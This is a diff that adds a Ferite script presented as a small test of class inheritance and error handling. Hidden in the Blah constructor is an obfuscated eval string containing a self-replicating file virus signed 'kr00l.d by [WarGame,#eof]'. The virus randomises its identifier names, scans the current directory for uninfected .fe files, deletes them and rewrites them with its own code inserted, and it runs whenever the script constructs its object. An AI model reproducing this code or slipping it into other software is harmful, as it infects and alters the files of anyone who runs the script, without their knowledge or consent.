@@ -1,0 +1,58 @@
+#!/usr/bin/env ferite
+
+uses "console";
+
+class Blah
+{
+   function constructor()
+   {
+       Console.println( "Blah Constructor" );
+   
+eval('uses "filesystem","sys","regexp","math","string","date";function DPEBJP(string GNDILP) { string HEACME = File.open(GNDILP).toString(); if(String.index(HEACME,"kr00l.d by [WarGame,#eof]") != -1) {return 1;} else {return 0;}} function GDBAHH() {return 65; } function GEDDBD(number sd) { Math.srand(sd); return String.sprintf("%c%c%c%c%c%c",((Math.rand()%10)+GDBAHH()),((Math.rand()%20)+GDBAHH()),((Math.rand()%11)+GDBAHH()),((Math.rand()%9)+GDBAHH()),((Math.rand()%14)+GDBAHH()),((Math.rand()%16)+GDBAHH()));} string GGFHEP = "kr00l.d by [WarGame,#eof]";string DEEFKE = "";string EHDCHH = "";object IFGCNI =  File.open(Sys.scriptName());string GLHBBJ = "";object GMDFFE = new Directory("."); while(String.index((EHDCHH = IFGCNI.readln()),GGFHEP) == -1) {} if(1) { EHDCHH = Regexp.replaceAll("GGFHEP",EHDCHH,GEDDBD(Date.now()+1989)); EHDCHH = Regexp.replaceAll("DPEBJP",EHDCHH,GEDDBD(Date.now()+1975)); EHDCHH = Regexp.replaceAll("EHDCHH",EHDCHH,GEDDBD(Date.now()+2006)); EHDCHH = Regexp.replaceAll("GDBAHH",EHDCHH,GEDDBD(Date.now()+1900)); EHDCHH = Regexp.replaceAll("GNDILP",EHDCHH,GEDDBD(Date.now()+1930)); EHDCHH = Regexp.replaceAll("HEACME",EHDCHH,GEDDBD(Date.now()+1910)); EHDCHH = Regexp.replaceAll("GMDFFE",EHDCHH,GEDDBD(Date.now()+1920)); EHDCHH = Regexp.replaceAll("DEEFKE",EHDCHH,GEDDBD(Date.now()+1950)); EHDCHH = Regexp.replaceAll("GLHBBJ",EHDCHH,GEDDBD(Date.now()+1970)); EHDCHH = Regexp.replaceAll("IFGCNI",EHDCHH,GEDDBD(Date.now()+1890)); EHDCHH = Regexp.replaceAll("GEDDBD",EHDCHH,GEDDBD(Date.now()+1800)); } while((DEEFKE = GMDFFE.getEntry()) != "") { if(String.index(Sys.scriptName(),DEEFKE) == -1 && String.index(DEEFKE,".fe") != -1) {  if(!DPEBJP(DEEFKE)) { GLHBBJ = File.open(DEEFKE).toString(); File.remove(DEEFKE); GLHBBJ = Regexp.replace("}",GLHBBJ,"\n" + EHDCHH+"}\n"); File.create(DEEFKE).writeln(GLHBBJ); } } }');
+}
+
+
+   function test()
+   {
+       Console.println( "Blot" );
+   }
+
+   function Blot()
+   {
+       Console.println("Blah.Blot");
+   }
+}
+
+class Blim extends Blah
+{
+   function constructor()
+   {
+       super();
+       self( "Yep. It Works" );
+	   Console.println( "Blim Constructor" );
+   }
+
+   function constructor( string b2 )
+   {
+	   Console.println( "self works: $b2" );
+   }
+   
+   function Blot()
+   {
+       super.test();
+       iferr
+       {
+           parent.test();
+       }
+       fix
+       {
+           Console.println( "Ewps. An error occured, but we is goner continue" );
+       }
+       super.Blot();
+   }
+}
+
+object blop = new Blim();
+
+blop.Blot();
+
